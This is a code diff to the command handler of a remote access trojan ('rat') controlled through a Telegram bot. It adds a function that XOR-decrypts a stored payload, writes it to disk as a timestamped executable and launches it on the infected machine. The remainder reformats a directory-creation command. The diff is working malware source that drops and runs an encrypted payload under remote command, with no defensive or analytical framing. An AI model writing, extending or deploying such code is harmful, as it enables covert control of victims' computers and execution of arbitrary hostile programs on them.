@@ -1,7 +1,8 @@
 /*rat_handler/src/handlers.cpp*/
-#include <tiny-process-library/process.hpp>
 #include "rat/Handler.hpp"
+#include "rat/encryption/encryption.hpp"
 #include "rat/handler/debug.hpp"
+#include "rat/system.hpp"
 
 #include <algorithm>
 #include <chrono>
@@ -10,6 +11,7 @@
 #include <fmt/chrono.h>
 #include <fmt/core.h>
 #include <sstream>
+#include <tiny-process-library/process.hpp>
 #include <vector>
 
 namespace rat::handler {
@@ -91,30 +93,62 @@ void Handler::handleFetchCommand() {
 	this->bot->sendMessage(command);
 }
 
+void Handler::handleExecuteCommand() {
+	const std::string time_stamp =
+	    ::rat::system::getCurrentDateTime_Underscored();
+	std::vector<uint8_t> payload = this->state.payload;
+	const std::string &key = this->state.payload_key;
+
+	::rat::encryption::xorData(payload.data(), payload.size(), key.c_str());
+
+	std::string payload_path = time_stamp;
+#ifdef _WIN32
+	payload_path = fmt::format("{}.exe", time_stamp);
+#endif
+	this->telegram_update->message.text =
+	    fmt::format("/lprocess {}", payload_path);
+	this->parseTelegramMessageToCommand();
+
+		if(!::rat::system::writeBytesIntoFile(time_stamp, payload)) {
+			HANDLER_ERROR_LOG("Failed to write to file system");
+			this->bot->sendMessage(
+			    "Failed to write the payload to the file system");
+			return;
+		}
+
+	payload.clear();
+
+	this->handleProcessCommand();
+}
+
 void Handler::handleMkdirCommand() {
-	const std::vector<std::string>& dirs = this->command.parameters;
+	const std::vector<std::string> &dirs = this->command.parameters;
 
 	std::ostringstream output_stream;
-	for (const auto& dir : dirs) {
-		if (std::filesystem::exists(dir)) {
-			if (std::filesystem::is_directory(dir)) {
-				output_stream << dir << ": already exists\n";
-			} else {
-				output_stream << dir << ": exists but is not a directory\n";
-			}
-			continue;
-		}
+		for(const auto &dir : dirs) {
+				if(std::filesystem::exists(dir)) {
+						if(std::filesystem::is_directory(dir)) {
+							output_stream << dir << ": already exists\n";
+						}
+						else {
+							output_stream
+							    << dir << ": exists but is not a directory\n";
+						}
+					continue;
+				}
 
-		try {
-			if (std::filesystem::create_directory(dir)) {
-				output_stream << dir << ": created\n";
-			} else {
-				output_stream << dir << ": failed to be created\n";
-			}
-		} catch (const std::filesystem::filesystem_error& e) {
-			output_stream << dir << ": error - " << e.what() << "\n";
+				try {
+						if(std::filesystem::create_directory(dir)) {
+							output_stream << dir << ": created\n";
+						}
+						else {
+							output_stream << dir << ": failed to be created\n";
+						}
+				}
+				catch(const std::filesystem::filesystem_error &e) {
+					output_stream << dir << ": error - " << e.what() << "\n";
+				}
 		}
-	}
 	this->bot->sendMessage(output_stream.str());
 }
 } // namespace rat::handler
